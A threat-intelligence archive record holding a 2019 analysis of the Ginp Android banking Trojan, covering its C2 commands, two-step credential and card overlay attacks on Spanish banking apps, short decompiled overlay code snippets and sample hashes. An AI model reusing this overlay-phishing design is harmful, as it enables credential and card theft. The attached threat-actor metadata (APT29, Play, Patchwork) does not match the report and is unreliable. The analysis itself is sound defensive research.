{
    "id": "79f80bb2-9679-4306-8955-6d213eacf285",
    "created_at": "2023-01-12T15:06:07.392277Z",
    "updated_at": "2025-03-27T02:16:26.387524Z",
    "deleted_at": null,
    "sha1_hash": "c67a8f1ee84cda506baee63db9540419383cb8a0",
    "title": "2019-11-01 - Ginp - A Malware Patchwork Borrowing From Anubis",
    "authors": "",
    "file_creation_date": "2022-05-28T23:38:50Z",
    "file_modification_date": "2022-05-28T23:38:50Z",
    "file_size": 5361459,
    "plain_text": "# Ginp - A malware patchwork borrowing from Anubis\n\n**[threatfabric.com/blogs/ginp_a_malware_patchwork_borrowing_from_anubis.html](https://www.threatfabric.com/blogs/ginp_a_malware_patchwork_borrowing_from_anubis.html)**\n\nNovember 2019\n\n## Intro\n\nThreatFabric analysts have recently investigated an interesting new strain of banking malware. The malware was\nfirst spotted by [Tatyana Shishkova from Kaspersky by end October 2019, but actually dates back to June 2019. It is](https://twitter.com/sh1shk0va/status/1186968376930897926)\nstill under active development, with at least 5 different versions of the Trojan released within the last 5 months (June\n\n- November 2019).\n\nWhat makes Ginp stand out is that it was built from scratch being expanded through regular updates, the last of\nwhich including code copied from the infamous Anubis banking Trojan, indicating that its author is cherry-picking the\nmost relevant functionality for its malware. In addition, its original target list is extremely narrow and seems to be\nfocused on Spanish banks. Last but not least, all the overlay screens (injects) for the banks include two steps; first\nstealing the victim’s login credentials, then their credit card details. Although multi-step overlays are not something\nnew, their usage is generally limited to avoid raising suspicion.\n\n## Evolution\n\nThe initial version of the malware dates back to early June 2019, masquerading as a “Google Play Verificator” app.\nAt that time, Ginp was a simple SMS stealer whose purpose was only to send a copy of incoming and outgoing\nSMS messages to the C2 server.\n\nA couple of months later, in August 2019, a new version was released with additional banking-specific features. This\nand following versions were masquerading as fake “Adobe Flash Player” apps. The malware was able to perform\noverlay attacks and become the default SMS app through the abuse of the Accessibility Service. The overlay\nconsisted of a generic credit card grabber targeting social and utility apps, such as Google Play, Facebook,\nWhatsApp, Chrome, Skype, Instagram and Twitter.\n\n\n-----\n\nAlthough early versions had some basic code and string obfuscation, protection of the third version of the malware\nwas enhanced with the use of payload obfuscation. The capabilities remained unchanged, but a new endpoint was\nadded to the Trojan C2 allowing it to handle the generic card grabber overlay and specific target overlays (banking\napps) separately. In addition, the credit card grabber target list was expanded with Snapchat and Viber.\n\nIn the third version spotted in the wild, the author introduced parts of the source code of the infamous Anubis Trojan\n(which was leaked earlier in 2019). This change came hand in hand with a new overlay target list, no longer\ntargeting social apps, but focusing on banking instead. A remarkable fact is that all the targeted apps relate to\nSpanish banks, including targets never seen before in any other Android banking Trojan. The 24 target apps belong\nto 7 different Spanish banks: Caixa bank, Bankinter, Bankia, BBVA, EVO Banco, Kutxabank and Santander. The\nspecific apps can be found in the target list in the appendix.\n\nThe most recent version of Ginp (at the time of writing) was detected at the end of November 2019. This version\nhas some small modifications which seems to be unused, as the malware behaviour is the same as the previous\nversion. The author has introduced the capability to grant the app the device admin permission. Additionally new\nendpoint was added that seems related to downloading a module for the malware, probably with new features or\nconfiguration.\n\n## How it works\n\nWhen the malware is first started on the device it will begin by removing its icon from the app drawer, hiding from\nthe end user. In the second step it asks the victim for the Accessibility Service privilege as visible in following\nscreenshot:\n\n\n-----\n\nOnce the user grants the requested Accessibility Service privilege, Ginp starts by granting itself additional\npermissions, such as (dynamic) permissions required in order to be able to send messages and make calls, without\nrequiring any further action from the victim. When done, the bot is functional and ready to receive commands and\nperform overlay attacks.\n\nThe commands supported by the most recent version of the bot are listed below. As can be observed, the\npossibilities offered by the bot are pretty common.\n\n**Command** **Description**\n\nSEND_SMS Send an SMS from the bot to a specific number\n\nNEW_URL Update the C2 URL\n\nKILL Disable the bot\n\nPING_DELAY Update interval between each ping request\n\nCLEAN_IGNORE_PKG Empty list of overlayed apps\n\n\n-----\n\n**Command** **Description**\n\nWRITE_INJECTS Update target list\n\nREAD_INJECTS Get current target list\n\nSTART_ADMIN Request Device Admin privileges\n\nALL_SMS Get all SMS messages\n\nDISABLE_ACCESSIBILITY Stop preventing user from disabling the accessibility service\n\nENABLE_ACCESSIBILITY Prevent user from disabling the accessibility service\n\nENABLE_HIDDEN_SMS Set malware as default SMS app\n\nDISABLE_HIDDEN_SMS Remove malware as default SMS app\n\nENABLE_EXTENDED_INJECT Enable overlay attacks\n\nDISABLE_EXTENDED_INJECT Disable overlay attacks\n\nENABLE_CC_GRABBER Enable the Google Play overlay\n\nDISABLE_CC_GRABBER Disable the Google Play overlay\n\nSTART_DEBUG Enable debugging\n\nGET_LOGCAT Get logs from the device\n\nSTOP_DEBUG Disable debugging\n\nGET_APPS Get installed applications\n\nGET_CONTACTS Get contacts\n\nSEND_BULK_SMS Send SMS to multiple numbers\n\nUPDATE_APK _Not implemented_\n\nINJECT_PACKAGE Add new overlay target\n\nCALL_FORWARD Enable/disable call forwarding\n\nSTART_PERMISSIONS Starts request for additional permissions(Accessibility privileges, battery\noptimizations bypass, dynamic permissions)\n\n## Features\n\nThe most recent version of Ginp has the same capabilities as most other Android banking Trojans, such as the use\nof overlay attacks, SMS control and contact list harvesting. Overall, it has a fairly common feature list, but it is\nexpected to expand in future updates. Since Ginp is already using some code from the Anubis Trojan, it is quite\nlikely that other, more advanced features from Anubis or other malware, such as a back-connect proxy, screenstreaming and RAT will also be added in the future.\n\nGinp embeds the following set of features, allowing it to remain under the radar and successfully perform attacks:\n\nOverlaying: Dynamic (local overlays obtained from the C2)\nSMS harvesting: SMS listing\nSMS harvesting: SMS forwarding\nContact list collection\nApplication listing\n\n\n-----\n\nOverlaying: Targets list update\nSMS: Sending\nCalls: Call forwarding\nC2 Resilience: Auxiliary C2 list\nSelf-protection: Hiding the App icon\nSelf-protection: Preventing removal\nSelf-protection: Emulation-detection\n\n### Update 10/03/2020\n\nAt the end of February the actors behind Ginp added screen capture capabilities to their Trojan. Like previously\nadded functionality, the code is borrowed from the leaked Anubis Trojan source code. It enables the bot to stream\nscreenshots and send them to the C2 so that actors can see what is happening on the screen of the infected\ndevice.\n\n## Overlay attack\n\nGinp uses the Accessibility Service to check which application runs is the foreground. If the package name of the\nforeground app is included in the target list, an overlay is shown. The WebView-based overlay is loading an HTML\npage provided by the C2 in response to the package name provided by the bot.\n\nThe following code snippet shows how the WebView is created.\n```\nprotected void onCreate(Bundle arg6) {\n  super.onCreate(arg6);\n  this.packageName = this.getIntent().getStringExtra(\"packageName\");\n  this.mContext = this;\n  String v6 = this.store.get(this, \"INJ_URL\");\n  Utils v0 = this.Tools;\n  v0.Log(this, \"\\[Injector\\] Starting injection on \" + this.packageName, Boolean.valueOf(true));\n  WebView v0_1 = new WebView(this);\n  v0_1.getSettings().setJavaScriptEnabled(true);\n  v0_1.setScrollBarStyle(0);\n  v0_1.setWebViewClient(new MyWebViewClient(this, null));\n  v0_1.setWebChromeClient(new MyWebChromeClient(this, null));\n  String v1_1 = Resources.getSystem().getConfiguration().locale.getCountry();\n  String v2 = Resources.getSystem().getConfiguration().locale.getLanguage();\n  v0\\_1.loadUrl(v6 + \"?package=\" + this.packageName + \"&device\\_id=\" + this.store.get(this,\n\"ANDROID\\_ID\") + \"&country=\" + v1\\_1.toLowerCase() + \"&lang=\" + v2.toLowerCase());\n  this.setContentView(v0_1);\n}\n\n```\nSomething that makes Ginp special is that all of its overlay screens for banking apps are consist of multiple steps,\nfirst stealing the victim’s login credentials, then stealing the credit card details (to “validate” the user identity), as\nshown in the screenshots hereafter:\n\n\n-----\n\nThe following code snippet shows that after the second overlay is filled-in and validated, it disappears and the\ntargeted application is added to the list of packages names to be ignored for future overlays attacks.\n```\npublic void onPageFinished(WebView arg3, String arg4) {\n  if(arg4.contains(\"|DONE|\")) {\n    Utils v3 = ActivityInjection.this.Tools;\n    Context v4 = ActivityInjection.this.mContext;\n    v3.Log(v4, \"\\[Injector\\] Grabbing on \" + ActivityInjection.this.packageName + \" completed.\",\nBoolean.valueOf(true));\n    ActivityInjection.this.Tools.addPackageToIgnore(ActivityInjection.this.mContext,\nActivityInjection.this.packageName);\n    ActivityInjection.this.finish();\n  }\n}\n\n## Targets\n\n```\nThe initial version of Ginp had a generic credit card grabber overlay screen used for all targeted applications. Still\nincluded in the last versions, this screen is only used to overlay the official Google Play Store app. More apps could\nbe added to the grabber target list in the future, such as the ones that were targeted in older versions:\n\nThe following screenshot shows the generic card grabber overlay screen:\n\n\n-----\n\n-----\n\nThe current active target list is available in the appendix, containing a total of 24 unique targets. The following\nscreenshots show what type of information is collected in both steps of the overlay attack:\n\n\n-----\n\n-----\n\n## Based on Anubis\n\nOnce the Anubis bot code got leaked, it was just a matter of time before new banking Trojans based on Anubis\nwould surface. When analyzing the Ginp’s recent samples, ThreatFabric analysts found some similarities with the\nfamous Android banking Trojan. Based on the evolution of Ginp it is clear that it isn’t based on Anubis, but rather\nreuses some of its code. Below are some of the elements showing the relation.\n\nThe names used for Android components are similar:\n\n\n-----\n\nWhen analyzing these components, similarities were found in the code of both malware families:\n\nAnother major change that indicated that the actor copied code from the Anubis Trojan is the way of handling\nconfiguration values. Previous versions were storing config values within the variables of a class, while the latest\nversion is using SharedPreferences with some of the keys being identical to those used by Anubis:\n\nisAccessibility\ntime_work\ntime_start_permission\nurl_inj\n\n## Conclusion\n\n\n-----\n\nGinp is a simple but rather efficient banking Trojan providing the basic functionality to be able to trick victims into\ndelivering personal information. In a 5-month timespan, actor managed to create a Trojan from scratch which will\npresumably continue evolving offering new features such as keylogging, back-connect proxy or RAT capabilities.\n\nGinp’s unusual target selection is not just about its focus on Spanish banks but also the wide selection of targeted\napps per bank. The fact that the overlay screens are almost identical to the legitimate banking apps suggests that\nthe actors might be very familiar with the Spanish banking applications and might even be accustomed to the\nlanguage.\n\nAlthough the current target list is limited to Spanish apps, it seems that the actor is taking into account that the bot\nshould also be able to target other countries, seeing that the path used in the inject requests contains the country\ncode of the targeted institution. This could indicate that actor already has plans in expanding the targets to\napplications from different countries and regions.\n\n## Mobile Threat Intelligence\n\nOur threat intelligence solution – MTI, provides the context and in-depth knowledge of the past and present\nmalware-powered threats in order to understand the future of the threat landscape. Such intelligence, includes both\nthe strategic overview on trends and the operational indicators to discern early signals of upcoming threats and\nbuild a future-proof security strategy.\n\n## Client Side Detection\n\nOur online fraud detection solution – CSD, presents financial institutions with the real-time overview on the risk\nstatus of their online channels and related devices. This overview provides all the relevant information and context\nto act upon threats before they turn into fraud. The connectivity with existing risk or fraud engines allows for\nautomated and orchestrated, round the clock fraud mitigation.\n\n## Appendix\n\n### Samples\n\nSome of the latest Ginp samples found in the wild:\n\n**App**\n**name** **Package name** **SHA-256 hash**\n\n\nGoogle\nPlay\nVerificator\n\nGoogle\nPlay\nVerificator\n\nAdobe\nFlash\nPlayer\n\nAdobe\nFlash\nPlayer\n\nAdobe\nFlash\nPlayer\n\n\nsing.guide.false 0ee075219a2dfde018f17561467272633821d19420c08cba14322cc3b93bb5d5\n\npark.rather.dance 087a3beea46f3d45649b7506073ef51c784036629ca78601a4593759b253d1b7\n\nethics.unknown.during 5ac6901b232c629bc246227b783867a0122f62f9e087ceb86d83d991e92dba2f\n\nsolution.rail.forward 7eb239cc86e80e6e1866e2b3a132b5af94a13d0d24f92068a6d2e66cfe5c2cea\n\ncom.pubhny.hekzhgjty 14a1b1dce69b742f7e258805594f07e0c5148b6963c12a8429d6e15ace3a503c\n\n\n-----\n\n**App**\n**name** **Package name** **SHA-256 hash**\n\n\nAdobe\nFlash\nPlayer\n\n### Target list\n\n\nsentence.fancy.humble 78557094dbabecdc17fb0edb4e3a94bae184e97b1b92801e4f8eb0f0626d6212\n\n\nThe current list of apps observed to be targeted by Ginp contains a total of 24 unique applications as seen below.\nThis list is expected to grow in the future.\n\n**Package name** **Application name**\n\ncom.android.vending Play Store\n\nes.lacaixa.hceicon2 CaixaBank Pay: Mobile Payments\n\nes.lacaixa.mobile.android.newwapicon CaixaBank\n\nes.caixabank.caixabanksign CaixaBank Sign - Digital Coordinate Card\n\nes.caixabank.mobile.android.tablet CaixaBank Tablet\n\ncom.imaginbank.app imaginBank - Your mobile bank\n\nes.lacaixa.app.multiestrella Family\n\ncom.bankinter.launcher Bankinter Móvil\n\ncom.bankinter.bkwallet Bankinter Wallet\n\ncom.bankinter.coincwallet COINC Wallet\n\ncom.bankinter.bankintercard bankintercard\n\nes.cm.android Bankia\n\ncom.bankia.wallet Bankia Wallet\n\nes.cm.android.tablet Bankia Tablet\n\ncom.bbva.bbvacontigo BBVA Spain\n\ncom.bbva.netcash BBVA Net Cash | ES & PT\n\nes.evobanco.bancamovil EVO Banco móvil\n\ncom.redsys.bizum EVO Bizum\n\ncom.kutxabank.android Kutxabank\n\nes.redsys.walletmb.app.kutxa.pro KutxabankPay\n\nes.bancosantander.apps Santander\n\nes.banconsantander.app.tablet Santander Tablet\n\nes.bancosantander.android.confirming Confirming Santander\n\ncom.tm.sanstp Santander Cash Nexus\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-11-01 - Ginp - A Malware Patchwork Borrowing From Anubis.pdf"
    ],
    "report_names": [
        "2019-11-01 - Ginp - A Malware Patchwork Borrowing From Anubis.pdf"
    ],
    "threat_actors": [
        {
            "id": "7ea1e0de-53b9-4059-802f-485884180701",
            "created_at": "2022-10-25T16:07:24.04846Z",
            "updated_at": "2025-03-27T02:02:10.090459Z",
            "deleted_at": null,
            "main_name": "Patchwork",
            "aliases": [
                "APT-C-09",
                "ATK 11",
                "Capricorn Organisation",
                "Chinastrats",
                "Dropping Elephant",
                "Maha Grass",
                "Quilted Tiger",
                "TG-4410",
                "Thirsty Gemini",
                "Zinc Emerson"
            ],
            "source_name": "ETDA:Patchwork",
            "tools": [
                "AndroRAT",
                "Artra Downloader",
                "ArtraDownloader",
                "AutoIt backdoor",
                "BADNEWS",
                "BIRDDOG",
                "Bahamut",
                "Bozok",
                "Bozok RAT",
                "Brute Ratel",
                "Brute Ratel C4",
                "CinaRAT",
                "Crypta",
                "ForeIT",
                "JakyllHyde",
                "Loki",
                "Loki.Rat",
                "LokiBot",
                "LokiPWS",
                "NDiskMonitor",
                "Nadrac",
                "PGoShell",
                "PowerSploit",
                "PubFantacy",
                "Quasar RAT",
                "QuasarRAT",
                "Ragnatela",
                "Ragnatela RAT",
                "SocksBot",
                "TINYTYPHON",
                "Unknown Logger",
                "WSCSPL",
                "Yggdrasil"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "9c884c88-2c9f-49c5-856a-2383ad1d8ef8",
            "created_at": "2024-05-01T02:03:08.152Z",
            "updated_at": "2025-03-27T02:05:17.422887Z",
            "deleted_at": null,
            "main_name": "ZINC EMERSON",
            "aliases": [
                "Dropping Elephant ",
                "EHDevel ",
                "Manul ",
                "Monsoon ",
                "Operation Hangover ",
                "Patchwork ",
                "TG-4410 ",
                "Viceroy Tiger ",
                "Confucius "
            ],
            "source_name": "Secureworks:ZINC EMERSON",
            "tools": [
                " Hanove",
                " Mac OS X KitM Spyware",
                " Proyecto2",
                " YTY Backdoor",
                "Enlighten Infostealer"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "c81067e0-9dcb-4e3f-abb0-80126519c5b6",
            "created_at": "2022-10-25T15:50:23.285448Z",
            "updated_at": "2025-03-27T02:00:55.42906Z",
            "deleted_at": null,
            "main_name": "Patchwork",
            "aliases": [
                "Hangover Group",
                "Dropping Elephant",
                "Chinastrats",
                "Operation Hangover"
            ],
            "source_name": "MITRE:Patchwork",
            "tools": [
                "NDiskMonitor",
                "QuasarRAT",
                "BackConfig",
                "TINYTYPHON",
                "AutoIt backdoor",
                "PowerSploit",
                "BADNEWS",
                "Unknown Logger",
                "Socksbot"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "20d3a08a-3b97-4b2f-90b8-92a89089a57a",
            "created_at": "2022-10-25T15:50:23.548494Z",
            "updated_at": "2025-03-27T02:00:55.49688Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "APT29",
                "IRON RITUAL",
                "IRON HEMLOCK",
                "NobleBaron",
                "Dark Halo",
                "NOBELIUM",
                "UNC2452",
                "YTTRIUM",
                "The Dukes",
                "Cozy Bear",
                "CozyDuke",
                "SolarStorm",
                "Blue Kitsune",
                "UNC3524",
                "Midnight Blizzard"
            ],
            "source_name": "MITRE:APT29",
            "tools": [
                "PinchDuke",
                "ROADTools",
                "WellMail",
                "CozyCar",
                "Mimikatz",
                "Tasklist",
                "OnionDuke",
                "FatDuke",
                "POSHSPY",
                "EnvyScout",
                "SoreFang",
                "GeminiDuke",
                "GoldMax",
                "FoggyWeb",
                "SDelete",
                "PolyglotDuke",
                "AADInternals",
                "MiniDuke",
                "SeaDuke",
                "Sibot",
                "RegDuke",
                "CloudDuke",
                "GoldFinder",
                "AdFind",
                "PsExec",
                "NativeZone",
                "Systeminfo",
                "ipconfig",
                "Impacket",
                "Cobalt Strike",
                "PowerDuke",
                "QUIETEXIT",
                "HAMMERTOSS",
                "BoomBox",
                "CosmicDuke",
                "WellMess",
                "VaporRage",
                "LiteDuke"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "46b3c0fc-fa0c-4d63-a38a-b33a524561fb",
            "created_at": "2023-01-06T13:46:38.393409Z",
            "updated_at": "2025-03-27T02:00:02.822155Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "The Dukes",
                "Minidionis",
                "Grizzly Steppe",
                "G0016",
                "Blue Kitsune",
                "BlueBravo",
                "SeaDuke",
                "Cloaked Ursa",
                "YTTRIUM",
                "ATK7",
                "Nobelium",
                "UAC-0029",
                "Group 100",
                "COZY BEAR",
                "IRON HEMLOCK",
                "TA421",
                "ITG11"
            ],
            "source_name": "MISPGALAXY:APT29",
            "tools": [
                "QUARTERRIG",
                "SNOWYAMBER",
                "HALFRIG"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535967,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1653781130,
    "ts_modification_date": 1653781130,
    "files": {
        "pdf": "https://archive.orkl.eu/c67a8f1ee84cda506baee63db9540419383cb8a0.pdf",
        "text": "https://archive.orkl.eu/c67a8f1ee84cda506baee63db9540419383cb8a0.txt",
        "img": "https://archive.orkl.eu/c67a8f1ee84cda506baee63db9540419383cb8a0.jpg"
    }
}